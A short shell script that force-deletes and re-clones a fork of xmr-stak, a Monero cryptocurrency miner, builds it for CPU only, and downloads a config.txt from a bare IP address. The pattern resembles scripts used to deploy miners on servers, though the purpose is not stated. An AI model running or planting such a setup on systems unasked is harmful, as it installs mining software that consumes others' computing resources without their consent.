
rm -rf xmr-stak

git clone https://github.com/redcatmiss/xmr-stak

cd xmr-stak

cmake3 -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF .

make

cd bin

wget http://45.32.31.230/config.txt

